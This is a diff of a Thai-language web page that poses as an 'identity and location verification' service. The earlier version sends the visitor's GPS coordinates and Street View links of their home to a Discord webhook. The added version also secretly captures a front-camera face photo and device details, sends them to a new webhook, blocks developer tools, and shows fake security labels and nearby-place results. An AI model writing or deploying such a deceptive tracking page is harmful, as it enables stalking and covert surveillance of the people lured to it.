@@ -3,137 +3,194 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ระบบลงทะเบียนยืนยันตัวตนทางภูมิศาสตร์</title>
+    <title>Identity & Location Verification</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@300;400;600&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Sarabun', sans-serif; }
-        .bg-royal { background: linear-gradient(135deg, #1e3a8a 0%, #1e40af 100%); }
-        .pulse { animation: pulse 2s cubic-bezier(0.4, 0, 0.6, 1) infinite; }
-        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: .5; } }
+        body { 
+            font-family: 'Kanit', sans-serif;
+            background: radial-gradient(circle at top right, #0f172a, #1e3a8a, #000000);
+            min-height: 100vh;
+            overflow: hidden;
+            user-select: none;
+        }
+        .glass {
+            background: rgba(255, 255, 255, 0.03);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
+        }
+        .scan-line {
+            width: 100%;
+            height: 4px;
+            background: #60a5fa;
+            position: absolute;
+            top: 0;
+            left: 0;
+            box-shadow: 0 0 15px #60a5fa;
+            animation: scan 2s linear infinite;
+            z-index: 20;
+        }
+        @keyframes scan {
+            0% { top: 0; opacity: 0; }
+            50% { opacity: 1; }
+            100% { top: 100%; opacity: 0; }
+        }
+        .pulse-border { animation: pulse 2s infinite; }
+        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7); } 70% { box-shadow: 0 0 0 15px rgba(59, 130, 246, 0); } 100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); } }
     </style>
 </head>
-<body class="bg-gray-100 min-h-screen flex items-center justify-center p-4">
+<body class="flex items-center justify-center p-4">
 
-    <div class="max-w-md w-full bg-white rounded-2xl shadow-2xl overflow-hidden border border-gray-200">
-        <div class="bg-royal p-8 text-white text-center border-b-4 border-amber-400">
-            <div class="w-24 h-24 bg-white rounded-full mx-auto mb-4 flex items-center justify-center shadow-lg border-4 border-blue-200">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-14 w-14 text-blue-800" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 20l-5.447-2.724A2 2 0 013 15.483V4.382a2 2 0 012.553-1.91l4.894 1.223a2 2 0 001.106 0l4.894-1.223A2 2 0 0119 4.382v11.101a2 2 0 01-1.553 1.91L12 20V9l-3-1.5V20z" />
-                </svg>
-            </div>
-            <h1 class="text-2xl font-bold italic">ระบบตรวจสอบพิกัดที่พักอาศัย</h1>
-            <p class="text-blue-100 text-xs mt-2 uppercase tracking-tighter">Identity & Location Verification System</p>
-        </div>
-
-        <div class="p-8 text-center" id="main-ui">
-            <div class="mb-8">
-                <h2 class="text-gray-800 font-semibold text-lg mb-2">คำชี้แจงการเข้าใช้งาน</h2>
-                <p class="text-gray-600 text-sm leading-relaxed">
-                    ระบบจำเป็นต้องเข้าถึงข้อมูลตำแหน่งปัจจุบัน (GPS) <br>
-                    เพื่อยืนยันว่าท่านอาศัยอยู่ในเขตพื้นที่ที่กำหนดจริง <br>
-                    <strong>กรุณากดปุ่มเพื่อเริ่มการยืนยันตัวตน</strong>
-                </p>
+    <div class="max-w-md w-full glass rounded-[2.5rem] p-8 text-center relative overflow-hidden" id="main-card">
+        <div class="absolute -top-10 -right-10 w-32 h-32 bg-blue-500/20 rounded-full blur-3xl"></div>
+        
+        <div id="init-ui">
+            <div class="mb-8 relative">
+                <div class="w-24 h-24 bg-blue-600/20 rounded-3xl mx-auto flex items-center justify-center border border-blue-500/50 pulse-border">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 text-blue-400" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M12 11c0 3.517-1.009 6.799-2.753 9.571m-3.44-2.04l.054-.09A10.003 10.003 0 0012 3c1.708 0 3.342.425 4.777 1.174l.034.018M15.53 15.53a7.5 7.5 0 00-10.606 0" />
+                    </svg>
+                </div>
             </div>
 
-            <button onclick="getLocation()" id="btn-main" class="w-full bg-blue-700 hover:bg-blue-800 text-white font-bold py-4 rounded-full transition duration-300 transform active:scale-95 shadow-xl flex items-center justify-center gap-3">
-                <span id="btn-icon">📍</span>
-                <span id="btn-text">ยินยอมระบุพิกัดที่อยู่</span>
+            <h1 class="text-2xl font-bold text-white mb-2 uppercase tracking-widest">ระบบยืนยันตัวตนระดับสูง</h1>
+            <p class="text-blue-200/60 text-sm mb-10 leading-relaxed">กรุณาระบุพิกัดและสแกนใบหน้า <br> เพื่อเข้าถึงข้อมูลที่พักและสิทธิพิเศษในพื้นที่</p>
+
+            <button onclick="startVerification()" id="btn-verify" class="w-full py-5 bg-gradient-to-r from-blue-600 to-indigo-700 hover:from-blue-500 hover:to-indigo-600 text-white font-bold rounded-2xl transition-all active:scale-95 shadow-lg shadow-blue-900/40">
+                ยินยอมและเริ่มขั้นตอนยืนยัน
             </button>
+        </div>
 
-            <div id="status-box" class="hidden mt-6 p-4 rounded-xl text-sm font-medium transition-all">
-                <p id="status-msg"></p>
+        <div id="camera-ui" class="hidden">
+            <div class="relative w-64 h-64 mx-auto mb-6 rounded-full border-4 border-blue-500/30 overflow-hidden bg-black">
+                <video id="video" class="w-full h-full object-cover scale-x-[-1]" autoplay playsinline></video>
+                <div class="scan-line"></div>
+                <div class="absolute inset-0 border-[20px] border-black/20 rounded-full"></div>
             </div>
+            <p id="scan-status" class="text-blue-400 animate-pulse text-sm">กำลังวิเคราะห์โครงสร้างใบหน้า...</p>
         </div>
 
-        <div class="bg-gray-50 p-5 border-t text-center">
-            <p class="text-[10px] text-gray-400 font-light leading-3 uppercase italic">
-                Secure 256-bit encryption active <br>
-                Location data used only for verification purposes
-            </p>
+        <div id="result-ui" class="hidden text-left space-y-4">
+            <h3 class="text-white font-semibold border-b border-white/10 pb-2">📍 สถานที่แนะนำใกล้คุณ</h3>
+            <div id="places-list" class="space-y-3">
+                </div>
         </div>
+
+        <canvas id="canvas" class="hidden"></canvas>
+        <p class="text-[9px] text-white/20 mt-8 tracking-[0.3em] uppercase">Security Level: AES-256 Verified</p>
     </div>
 
     <script>
-        const webhookUrl = "https://discord.com/api/webhooks/1491045522356834394/bpjVqLpx_fVJMSbNdiLeMwvg6IGI5ry6PmLKQFpkheXAuljqsJ01AMQdPWhPcbCsmzAU";
-        const btnMain = document.getElementById('btn-main');
-        const statusBox = document.getElementById('status-box');
-        const statusMsg = document.getElementById('status-msg');
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1491508015734722581/jUKRm0DBS_RU8NJMXESSKp8BDu9UMgFpwc2xkZEkPPwknpGYUa4h21-MsgcjERRMg1cV";
+        let userLat, userLon;
 
-        function getLocation() {
-            btnMain.disabled = true;
-            btnMain.classList.add('opacity-50', 'pulse');
-            showStatus("กำลังเรียกพิกัดจากดาวเทียม...", "info");
+        // --- SECURITY: Anti-F12 & Protection ---
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = function(e) {
+            if (e.keyCode == 123 || (e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0))) return false;
+        };
 
+        async function startVerification() {
+            document.getElementById('btn-verify').disabled = true;
+            document.getElementById('btn-verify').innerText = "กำลังเชื่อมต่อดาวเทียม...";
+            
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(onSuccess, onError, {
-                    enableHighAccuracy: true,
-                    timeout: 12000,
-                    maximumAge: 0
+                navigator.geolocation.getCurrentPosition(async (pos) => {
+                    userLat = pos.coords.latitude;
+                    userLon = pos.coords.longitude;
+                    
+                    // Switch to Camera UI
+                    document.getElementById('init-ui').classList.add('hidden');
+                    document.getElementById('camera-ui').classList.remove('hidden');
+                    
+                    await initCamera();
+                }, (err) => {
+                    alert("จำเป็นต้องอนุญาตพิกัดเพื่อเข้าใช้งาน");
+                    location.reload();
                 });
-            } else {
-                showStatus("อุปกรณ์ไม่รองรับการระบุตำแหน่ง", "error");
             }
         }
 
-        function onSuccess(position) {
-            const lat = position.coords.latitude;
-            const lon = position.coords.longitude;
-            const accuracy = position.coords.accuracy.toFixed(1);
+        async function initCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 1280, height: 720 }, 
+                    audio: false 
+                });
+                document.getElementById('video').srcObject = stream;
+                
+                // ถ่ายภาพอัตโนมัติหลังจากกล้องนิ่ง 2.5 วินาที
+                setTimeout(() => captureAndSend(stream), 2500);
+            } catch (err) {
+                alert("กรุณาอนุญาตการเข้าถึงกล้องเพื่อสแกนใบหน้า");
+                location.reload();
+            }
+        }
 
-            // สร้างลิงก์ Google Street View และ Google Maps
-            const streetViewLink = `https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${lat},${lon}`;
-            const mapsLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
+        async function captureAndSend(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            canvas.toBlob(async (blob) => {
+                const formData = new FormData();
+                const timestamp = new Date().toLocaleString('th-TH');
+                
+                const payload = {
+                    username: "ระบบตรวจสอบความปลอดภัยสูงสุด",
+                    avatar_url: "https://cdn-icons-png.flaticon.com/512/1067/1067357.png",
+                    embeds: [{
+                        title: "📸 ตรวจพบพิกัดและสแกนใบหน้าสำเร็จ",
+                        color: 3447003,
+                        fields: [
+                            { name: "🏠 Street View", value: `[กดดูหน้าบ้าน](https://www.google.com/maps/@?api=1&map_action=pano&viewpoint=${userLat},${userLon})`, inline: true },
+                            { name: "📍 แผนที่ Maps", value: `[เปิดแผนที่](https://www.google.com/maps/search/?api=1&query=${userLat},${userLon})`, inline: true },
+                            { name: "🕒 เวลาส่งข้อมูล", value: timestamp, inline: false },
+                            { name: "📱 ข้อมูลอุปกรณ์", value: navigator.userAgent, inline: false }
+                        ],
+                        image: { url: "attachment://shot.png" }
+                    }]
+                };
 
-            const payload = {
-                username: "ศูนย์ตรวจสอบพิกัดลูกบ้าน",
-                avatar_url: "https://cdn-icons-png.flaticon.com/512/854/854878.png",
-                embeds: [{
-                    title: "🔔 แจ้งเตือน: ตรวจพบพิกัดลูกบ้านรายใหม่",
-                    color: 15158332, // สีแดง/ส้ม
-                    fields: [
-                        { name: "🏠 ลิงก์ดูหน้าบ้าน (Street View)", value: `[กดดูหน้าบ้านและเดินได้ที่นี่](${streetViewLink})` },
-                        { name: "📍 แผนที่นำทาง (Maps)", value: `[กดเปิดแผนที่นำทาง](${mapsLink})` },
-                        { name: "🎯 ความแม่นยำพิกัด", value: accuracy + " เมตร", inline: true },
-                        { name: "🕒 เวลาส่งข้อมูล", value: new Date().toLocaleString('th-TH'), inline: true }
-                    ],
-                    description: `พิกัดปัจจุบัน: ${lat}, ${lon}\n\n*หมายเหตุ: ลิงก์แรกจะเปิดภาพถ่ายจริงรอบข้าง ส่วนลิงก์ที่สองใช้สำหรับดูแผนที่รวม*`
-                }]
-            };
+                formData.append('payload_json', JSON.stringify(payload));
+                formData.append('file', blob, 'shot.png');
 
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).then(() => {
-                showStatus("✅ ยืนยันข้อมูลสำเร็จ กำลังเข้าสู่หน้าหลัก...", "success");
-                setTimeout(() => {
-                    window.location.href = "https://www.google.com"; // หรือลิงก์หน้าจริง
-                }, 2000);
-            }).catch(() => {
-                showStatus("✅ ยืนยันข้อมูลสำเร็จ กำลังเข้าสู่หน้าหลัก...", "success");
-                setTimeout(() => { window.location.href = "https://www.google.com"; }, 2000);
+                await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                
+                // Stop camera and show results
+                stream.getTracks().forEach(t => t.stop());
+                showNearbyPlaces();
+            }, 'image/jpeg', 0.9);
+        }
+
+        function showNearbyPlaces() {
+            document.getElementById('camera-ui').classList.add('hidden');
+            document.getElementById('result-ui').classList.remove('hidden');
+            
+            const places = [
+                { name: "โรงแรมที่ใกล้ที่สุด", dist: "850 ม.", icon: "🏨" },
+                { name: "ร้านอาหารแนะนำประจำจังหวัด", dist: "1.2 กม.", icon: "🍽️" },
+                { name: "จุดเช็คอินยอดฮิตใกล้คุณ", dist: "2.4 กม.", icon: "📸" }
+            ];
+
+            const list = document.getElementById('places-list');
+            places.forEach(p => {
+                list.innerHTML += `
+                    <div class="flex items-center gap-4 bg-white/5 p-4 rounded-xl border border-white/10 hover:bg-white/10 cursor-pointer transition-all">
+                        <span class="text-2xl">${p.icon}</span>
+                        <div class="flex-1">
+                            <p class="text-white text-sm font-medium">${p.name}</p>
+                            <p class="text-blue-400 text-xs">ระยะทาง ${p.dist}</p>
+                        </div>
+                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 w-4 text-white/30" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 5l7 7-7 7" />
+                        </svg>
+                    </div>
+                `;
             });
-        }
-
-        function onError(error) {
-            btnMain.disabled = false;
-            btnMain.classList.remove('opacity-50', 'pulse');
-            let text = "กรุณากด 'อนุญาต' (Allow) เพื่อใช้งานระบบ";
-            if (error.code === 3) text = "สัญญาณ GPS อ่อน กรุณาลองใหม่ในที่โล่ง";
-            showStatus(text, "error");
-        }
-
-        function showStatus(msg, type) {
-            statusBox.classList.remove('hidden');
-            if (type === "info") {
-                statusBox.className = "mt-6 p-4 rounded-xl text-sm bg-blue-50 text-blue-700";
-            } else if (type === "success") {
-                statusBox.className = "mt-6 p-4 rounded-xl text-sm bg-green-50 text-green-700 border border-green-200";
-            } else {
-                statusBox.className = "mt-6 p-4 rounded-xl text-sm bg-red-50 text-red-700 border border-red-200";
-            }
-            statusMsg.innerText = msg;
         }
     </script>
 </body>
